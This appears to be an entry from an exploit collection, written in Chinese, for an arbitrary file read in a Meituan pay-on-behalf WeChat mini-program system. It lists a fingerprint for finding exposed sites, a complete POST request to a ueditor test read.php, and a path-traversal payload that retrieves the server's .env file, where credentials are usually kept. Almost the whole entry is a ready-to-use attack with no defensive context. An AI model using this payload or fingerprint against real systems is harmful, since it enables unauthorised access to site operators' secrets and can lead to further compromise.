# A2425美团代付三合一微信小程序系统read.php前台任意文件读取漏洞

- **系统**：A2425　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"/h5/static/js/chunk-vendors.js"`
- **请求**：`POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 27`

**请求体 / payload**
```
name=../../../../../../.env
```
- **预期**：200　|　—